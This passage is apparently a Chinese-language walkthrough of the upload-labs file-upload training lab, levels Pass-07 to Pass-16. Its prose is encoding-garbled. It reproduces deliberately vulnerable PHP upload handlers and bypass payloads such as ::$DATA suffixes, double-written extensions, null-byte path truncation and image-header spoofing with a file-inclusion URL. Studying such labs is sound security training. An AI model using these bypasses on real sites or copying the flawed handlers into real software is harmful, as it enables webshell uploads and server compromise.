array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; æ²¡æœ‰åˆ é™¤. åœ¨Winä¸‹xx.jpg[ç©ºæ ¼] æˆ–xx.jpg.è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹æ­¤å¤„ä¼šåˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª.phpç©ºæ ¼æ–‡ä»¶å³å¯ .php.ç»•è¿‡äº†$deny_extçš„éªŒè¯ï¼Œå¯¼è‡´äº†æ–‡ä»¶ä¸Šä¼  2. åˆ©ç”¨ Pass-08 ::$DATAç»•è¿‡1. ä»£ç 123456789101112131415161718192021222324252627# Pass-08$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; NTFSæ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬å¯¹å¤‡ç”¨æ•°æ®æµçš„æ”¯æŒã€‚è¿™ä¸æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„åŠŸèƒ½ï¼Œä¸»è¦åŒ…æ‹¬æä¾›ä¸Macintoshæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶çš„å…¼å®¹æ€§ã€‚å¤‡ç”¨æ•°æ®æµå…è®¸æ–‡ä»¶åŒ…å«å¤šä¸ªæ•°æ®æµã€‚æ¯ä¸ªæ–‡ä»¶è‡³å°‘æœ‰ä¸€ä¸ªæ•°æ®æµã€‚åœ¨Windowsä¸­ï¼Œæ­¤é»˜è®¤æ•°æ®æµç§°ä¸ºï¼š$ DATAã€‚å½“æˆ‘ä»¬è®¿é—®tao.php::DATAæ—¶ï¼Œå°±æ˜¯è¯·æ±‚ tao.php æœ¬èº«çš„æ•°æ®,å¦‚æœtao.php è¿˜åŒ…å«äº†å…¶ä»–çš„æ•°æ®æµï¼Œæ¯”å¦‚ tao.php:test.phpï¼Œè¯·æ±‚ tao.php:test.php::$DATAï¼Œåˆ™æ˜¯è¯·æ±‚tao.phpä¸­çš„æµæ•°æ®test.phpçš„æµæ•°æ®å†…å®¹ æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ phpinfo.php::$DATAå³å¯ç»•è¿‡ã€‚(ä»…é™windows) 2. åˆ©ç”¨ æˆ‘ä»¬è®¿é—®çš„æ—¶å€™éœ€è¦åˆ å»::$DATA,ç›´æ¥è®¿é—®phpæ–‡ä»¶ Pass-09 .ç©ºæ ¼.ç»•è¿‡1. åˆ†æ123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ä»£ç åˆ†æå¦‚ä¸‹: 123456789101112131415161718$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);/*å½“æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶åä¸º`phpinfo.php. .`æ—¶ï¼Œå› ä¸ºè¿™é‡Œtrimå¤„ç†çš„æ˜¯å­—ç¬¦ä¸¤è¾¹çš„ç©ºæ ¼ï¼Œæ‰€ä»¥$file_name=`phpinfo.php. .`*/$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹// ä¸Šé¢ä»£ç åˆ é™¤äº†æœ«å°¾çš„ç‚¹ï¼Œæ‰€ä»¥æ­¤æ—¶$file_name = `phpinfo.php. `, æ³¨æ„ï¼Œåé¢åˆç©ºæ ¼$file_ext = strrchr($file_name, &#x27;.&#x27;);// sttrchr æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦// é‚£ä¹ˆ$file_ext=&quot;. &quot;$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA$file_ext = trim($file_ext); //é¦–å°¾å»ç©º# æœ€ç»ˆ$file_ext=&quot;.&quot;, ç»•è¿‡æ ¡éªŒ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; move_uploaded_file($temp_file, $img_path);# è¿™é‡Œæœ€ç»ˆæ–‡ä»¶åæ‹¼æ¥çš„æ˜¯$file_name,åˆ™æœ€ç»ˆä¸Šä¼ çš„æ–‡ä»¶åä¸º`phpinfo.php. ` 2. åˆ©ç”¨ è¿™é‡Œè§£æåŒç†Pass-06 and Pass-07 Pass-10 phpåŒå†™ç»•è¿‡1. åˆ†æ1234567891011121314151617181920# Pass-10$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; str_ireplace() å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚ è¯¥å‡½æ•°å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚ å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ã€‚ å¦‚æœåŒæ—¶éœ€è¦å¯¹æ•°ç»„è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå¹¶ä¸”éœ€è¦æ‰§è¡Œæ›¿æ¢çš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šä½™å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ å¦‚æœæ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†åªå¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œé‚£ä¹ˆæ›¿ä»£å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨ã€‚ è¯­æ³•ï¼šstr_ireplace(find,replace,string,count) æ³¨é‡Šï¼šè¯¥å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚è¯·ä½¿ç”¨ str_replace() å‡½æ•°æ‰§è¡ŒåŒºåˆ†å¤§å°å†™çš„æœç´¢ å‚æ•° æè¿° find å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚ replace å¿…éœ€ã€‚è§„å®šæ›¿æ¢ find ä¸­çš„å€¼çš„å€¼ã€‚ string å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚ count å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚ è¿™é‡Œæ¼æ´çš„äº§ç”Ÿå‘ç”Ÿåœ¨ç¬¬9è¡Œï¼Œstr_ireplace(), å°†åŒ¹é…$deny_extæ•°ç»„ä¸­çš„å­—ç¬¦æ›¿æ¢ , è€Œè¿™é‡Œåªè¿›è¡Œäº†ä¸€æ¬¡æ›¿æ¢ï¼Œä¹ŸåŠå°†è¿™é‡Œ$file_name è®¾ç½®ä¸ºpphphp é€šè¿‡ä¸€æ¬¡str_ireplace()çš„æ›¿æ¢ï¼Œ$file_nameçš„å€¼å°†ä¸ºç­‰äºphp, å³å¯ç»•è¿‡ 2. åˆ©ç”¨ phpinfo.pphphp -&gt; info.php Qï¼šä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µå‘¢ï¼Ÿ Aï¼šæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºstr_ireplace()å‡½æ•°åŒ¹é…æ˜¯ä»å¤´åˆ°å°¾ï¼Œè€Œä¸”åªåŒ¹é…ä¸€éï¼Œä¸‹é¢çš„ä»£ç ä¹Ÿå¾ˆå¥½çš„è¯´æ˜äº†è¿™ä¸€ç‚¹ Pass-11 %00æˆªæ–­1. ä»£ç åˆ†æ12345678910111213141516171819# Pass-11$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125;&#125; substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚ æ³¨é‡Šï¼šå¦‚æœ start å‚æ•°æ˜¯è´Ÿæ•°ä¸” length å°äºæˆ–ç­‰äº startï¼Œåˆ™ length ä¸º 0 è¯­æ³•ï¼šsubstr(string,start,length) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¦è¿”å›å…¶ä¸­ä¸€éƒ¨åˆ†çš„å­—ç¬¦ä¸²ã€‚ start å¿…éœ€ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚æ­£æ•° - åœ¨å­—ç¬¦ä¸²çš„æŒ‡å®šä½ç½®å¼€å§‹è´Ÿæ•° - åœ¨ä»å­—ç¬¦ä¸²ç»“å°¾çš„æŒ‡å®šä½ç½®å¼€å§‹0 - åœ¨å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤„å¼€å§‹ length å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚æ­£æ•° - ä» start å‚æ•°æ‰€åœ¨çš„ä½ç½®è¿”å›è´Ÿæ•° - ä»å­—ç¬¦ä¸²æœ«ç«¯è¿”å› è¿”å›å€¼ï¼š è¿”å›å­—ç¬¦ä¸²çš„æå–éƒ¨åˆ†ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› FALSEï¼Œæˆ–è€…è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚ strrpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½® æ³¨é‡Šï¼šstrrpos() å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿ è¯­æ³•ï¼šstrrpos(string,find,start) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚ find å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚ start å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚ è¿”å›å€¼ï¼š è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALS CVE-2015-2348å½±å“ç‰ˆæœ¬ï¼š5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7expï¼šmove_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;/file.php\\x00.jpg&quot;); 2. åˆ©ç”¨ Pass-12 0x00ç»•è¿‡1. åˆ†æ12345678910111213141516171819#Pass-12$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;; &#125; &#125; else &#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125;&#125; php.iniè®¾ç½® magic_quotes_gpc = Off åŸç†åŒPass-11ï¼Œä¸Šä¼ è·¯å¾„0x00ç»•è¿‡ã€‚åˆ©ç”¨Burpsuiteçš„HexåŠŸèƒ½å°†save_pathæ”¹æˆ../upload/12.php(äºŒè¿›åˆ¶00)å½¢å¼ 2. åˆ©ç”¨ 1å¯¹åº”31ï¼Œæˆ‘ä»¬å°†31æ”¹æˆ00, Pass-13 æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡1. åˆ†æ12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;&#125; é€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œ 2. åˆ©ç”¨ ç»“åˆæ–‡ä»¶ä¸Šä¼ ï¼Œæ„é€ payload:http://172.16.9.177/include.php?file=upload/5920201103201712.gif Pass-14 æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡åŒç†Pass-13 Pass-15 æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡åŒç†Pass14 Pass-16 å›¾ç‰‡é©¬1. åˆ†æ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext= substr(strrchr($filename,&quot;.&quot;),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;; &#125;&#125; 